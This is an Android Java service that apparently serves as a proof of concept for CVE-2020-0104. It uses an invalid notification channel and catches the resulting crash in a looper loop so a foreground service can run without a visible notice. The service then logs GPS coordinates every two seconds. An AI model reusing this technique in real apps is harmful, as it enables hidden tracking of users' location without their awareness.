package cn.wrlu.servicecheater;

import android.Manifest;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

public class FServiceB extends Service {
    private static final String TAG = "FServiceB";

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        Handle the exception in main loop
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        Looper.loop();
                    } catch (Throwable e) {
                        e.printStackTrace();
                    }
                }
            }
        });
//        Create a Notification object with a invalid channel ID
        Notification notification = new NotificationCompat.Builder(this, "InvalidInvalidInvalid" /* A Invalid Channel ID */)
                .setContentTitle("Testing CVE-2020-0104")
                .setContentText("If you see this means you device is not vulnerable")
                .setWhen(System.currentTimeMillis())
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher_foreground))
                .build();
        startForeground(2, notification);
        refreshLocation();
        return super.onStartCommand(intent, flags, startId);
    }

    public void refreshLocation() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        String provider = LocationManager.GPS_PROVIDER;
        if (!checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            return;
        }
        locationManager.requestLocationUpdates(provider, 2000, 10, new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                double lat = location.getLatitude();
                double lng = location.getLongitude();
                Log.i(TAG, "Location Update: Latitude="+lat+",Longitude="+lng);
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {

            }
        });
    }

    private boolean checkPermission(String permission) {
        return ActivityCompat.checkSelfPermission(this,
                permission) ==
                PackageManager.PERMISSION_GRANTED;
    }
}
